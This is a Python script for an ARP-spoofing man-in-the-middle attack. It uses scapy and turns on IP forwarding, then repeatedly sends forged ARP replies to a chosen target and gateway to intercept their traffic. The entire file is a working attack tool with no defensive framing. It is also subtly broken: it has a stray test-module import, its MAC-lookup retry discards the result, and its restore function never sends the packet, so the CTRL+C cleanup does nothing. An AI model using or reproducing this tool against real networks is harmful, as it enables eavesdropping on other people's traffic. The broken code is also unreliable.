#! usr/bin/python

import time
from twisted.conch.test.test_recvline import end

import scapy.all as scapy
import argparse
import os

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def capture_ips():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target machine IP address.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway or Router IP address.")
    victims = parser.parse_args()
    if not victims.target_ip or not victims.gateway_ip:
        parser.error("[-] Please specify both a target and a gateway, use --help for info")
    return victims


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast_mac / arp_request
    try:
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except Exception as e:
        print("\n\n [-] Error getting mac address ... retrying.\n\n")
        get_mac(ip)


def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
                       psrc=source_ip, hwsrc=get_mac(source_ip))


def middle_man(target_ip, gateway_ip):
    try:
        sent_packets_count = 0
        while True:
            # victim - router / router - victim
            arp_spoof(target_ip, gateway_ip)
            arp_spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets sent: " + str(sent_packets_count))
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("[+] Detected CTRL+C ... Resetting ARP tables now ... please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)


targets = capture_ips()
target_ip = targets.target_ip
gateway_ip = targets.gateway_ip

middle_man(target_ip, gateway_ip)
